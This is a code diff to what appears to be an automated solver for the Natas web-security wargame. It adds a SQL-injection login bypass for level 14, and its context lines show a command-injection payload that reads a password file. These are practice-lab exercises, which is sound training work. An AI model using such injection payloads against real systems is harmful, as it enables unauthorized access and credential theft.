@@ -139,6 +139,8 @@ def getPassword(auth, level) :
 
 		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas' + str(level + 1))
 		pattern = r'(\w+)'
+	elif level == 14 :
+		url += '?username=1" or 1=1 %23&password=1'
 	else :
 		return str(level + 1) + ' not work'
 	
